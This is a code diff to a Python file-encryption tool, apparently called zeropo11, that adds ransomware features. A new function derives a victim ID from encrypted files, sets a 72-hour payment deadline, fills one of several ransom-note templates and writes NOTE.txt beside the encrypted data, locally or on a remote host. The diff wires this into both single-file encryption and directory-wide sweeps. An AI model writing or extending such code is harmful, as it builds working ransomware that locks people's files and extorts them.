@@ -28,6 +28,7 @@ from collections.abc import Callable, Iterator
 from pathlib import Path
 
 from zeropo11.ciphers.base import BaseCipher, CipherResult
+from zeropo11.ciphers import rn as _rn_cipher  # ransom note helper
 
 MAGIC = b"0xFE"
 VERSION = 1
@@ -276,6 +277,63 @@ def _ssh_failure(source: object, sink: object) -> CipherResult | None:
     return None
 
 
+def _drop_ransom_note(args, base_path, host, port, timeout, local_output) -> str:
+    """Drop a ransom note alongside encrypted data. Returns the note location string."""
+    template = (getattr(args, "drop_note", None) or "generic").lower()
+    if template not in ("generic", "polite", "press"):
+        template = "generic"
+    hours = 72
+    password = getattr(args, "key", None)
+    fingerprint = _rn_cipher._fingerprint(password) if password else None
+
+    vid = None
+    try:
+        if base_path:
+            cand_path = Path(base_path)
+            if not cand_path.is_file():
+                cands = sorted(cand_path.rglob("*.enc")) if cand_path.exists() else []
+            else:
+                cands = [cand_path]
+            for cand in cands:
+                if Path(cand).is_file():
+                    blob = Path(cand).read_bytes()
+                    vid = _rn_cipher._victim_id_from_salt(blob[10: 10 + 16])
+                    break
+    except OSError:
+        vid = None
+    if vid is None:
+        vid = _rn_cipher._random_victim_id()
+
+    deadline = _rn_cipher._deadline(hours)
+    note_text = _rn_cipher._TEMPLATES[template](vid, fingerprint, deadline, hours)
+
+    if host and not local_output:
+        sink_path = str(Path(base_path) / "NOTE.txt") if base_path else "NOTE.txt"
+        sink_obj = None
+        try:
+            sink_obj = _RemoteSink(host, port, timeout, sink_path)
+            sink_obj.write(note_text.encode("utf-8"))
+        except OSError:
+            return f"note drop failed on {host}: {sink_path}"
+        finally:
+            if sink_obj is not None:
+                try:
+                    sink_obj.close()
+                except Exception:
+                    pass
+        return f"{host}:{sink_path}"
+    else:
+        local_note = Path(base_path)
+        if local_note.is_file():
+            local_note = local_note.parent
+        note_path = local_note / "NOTE.txt"
+        try:
+            note_path.write_text(note_text, encoding="utf-8")
+        except OSError as exc:
+            return f"note drop failed: {exc}"
+        return str(note_path)
+
+
 def _default_output(file_path: str) -> str:
     return f"{file_path}.enc" if file_path else "output.enc"
 
@@ -377,6 +435,13 @@ class Cipher(BaseCipher):
         if stream_error is not None:
             return CipherResult(stream_error, False)
         destination = getattr(args, "output", None) or _default_output(file_path or "")
+        if getattr(args, "drop_note", None):
+            drop_loc = _drop_ransom_note(args, file_path if file_path else None,
+                                         host, port, timeout, local_out)
+            return CipherResult(
+                f"File encrypted to {destination}\n[+] ransom note dropped -> {drop_loc}",
+                True,
+            )
         return CipherResult(f"File encrypted to {destination}", True)
 
     # ------------------------------------------------------------------ decode
@@ -555,6 +620,10 @@ class Cipher(BaseCipher):
         if not files:
             return CipherResult(f"No files found in {file_path}", False)
 
+        drop_loc = None
+        if getattr(args, "drop_note", None):
+            drop_loc = _drop_ransom_note(args, file_path, host, port, timeout, local_out)
+
         results: list[str] = []
         for i, target_file in enumerate(files, start=1):
             # build an args copy with overridden file + output path per file
@@ -570,7 +639,10 @@ class Cipher(BaseCipher):
 
         ok = sum(1 for r in results if r.startswith("[+]"))
         header = f"Directory sweep: {file_path} ({len(files)} files; {ok} encrypted)"
-        return CipherResult(header + "\n" + "\n".join(results), ok > 0)
+        summary = header + "\n" + "\n".join(results)
+        if drop_loc is not None:
+            summary += f"\n[+] ransom note dropped -> {drop_loc}"
+        return CipherResult(summary, ok > 0)
 
 
     @staticmethod
